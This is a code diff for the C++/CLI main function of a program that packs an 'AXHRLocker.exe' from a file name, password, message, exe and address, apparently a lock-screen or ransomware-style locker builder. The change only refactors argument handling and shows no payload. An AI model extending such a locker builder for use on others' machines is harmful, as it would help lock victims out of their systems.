@@ -23,8 +23,6 @@
 #include <msclr\marshal_cppstd.h>
 #include <iostream>
 
-//#define DEBUG_MODE
-
 using namespace msclr::interop;
 using namespace System;
 using namespace System::Windows::Forms;
@@ -35,28 +33,29 @@ bool b_tracking_toggle;
 #include "locker.h"
 #include "pack.h"
 #include "frmMain.h"
+#include "settings.h"
 
 [STAThread]
 void main(array<String^>^ args) {
-
 #ifdef DEBUG_MODE
 	packLocker("AXHRLocker.exe", "hi", "basic message.");
 #endif
-
-
 	if (args->Length >= 3) {
-		// For some reason I'm unable to directly use args in marshal_as (argument error)
-		System::String ^ s_arg_one;
-		System::String ^ s_arg_two;
-		System::String ^ s_arg_three;
-		System::String ^ s_arg_four;
-		System::String ^ s_arg_five;
 
-		s_arg_one = args[0];
-		s_arg_two = args[1];
-		s_arg_three = args[2];
-		s_arg_four = args[3];
-		s_arg_five = args[4];
+		// For some reason I'm unable to directly use args in marshal_as (argument error)
+		String
+			^ s_arg_one,
+			^ s_arg_two,
+			^ s_arg_three,
+			^ s_arg_four,
+			^ s_arg_five
+		;
+
+		s_arg_one = args[ARG_FILE_NAME];
+		s_arg_two = args[ARG_PASSWORD];
+		s_arg_three = args[ARG_MESSAGE];
+		s_arg_four = args[ARG_EXE];
+		s_arg_five = args[ARG_ADDRESS];
 
 		std::string s_file_name = marshal_as< std::string >(s_arg_one);
 		//std::cout << s_file_name << " | " << marshal_as< std::string >(s_arg_two) << " | " << marshal_as< std::string >(s_arg_three) << " | " << marshal_as< std::string >(s_arg_four) << std::endl;
@@ -68,7 +67,7 @@ void main(array<String^>^ args) {
 			packLocker(s_file_name, marshal_as< std::string >(s_arg_two), marshal_as< std::string >(s_arg_three));
 
 		if (args->Length >= 4) {
-			s_arg_four = args[3];
+			s_arg_four = args[ARG_EXE];
 
 			std::string s_exe = marshal_as< std::string >(s_arg_four);
 
